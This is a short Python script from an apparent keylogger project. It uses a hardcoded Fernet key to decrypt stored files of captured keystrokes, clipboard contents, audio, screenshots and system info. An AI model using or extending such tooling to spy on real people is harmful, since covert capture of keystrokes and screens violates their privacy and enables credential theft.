from cryptography.fernet import Fernet

key = "DBLsxNY7NlUoEF8RHnP8hznDO7z72yrNqEmIf6at4iw="
keys_info = "keys.txt"
system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"
file_path = "C:\\Users\KeshavG\\Scripts\\Keylogger_Project\\"
encrypted_files = [file_path + keys_info, file_path + system_info, file_path + audio_info, file_path + clipboard_info, file_path + screenshot_info]

count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()
        fernet = Fernet(key)
        decrypted = fernet.decrypt(data)
    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)
    count += 1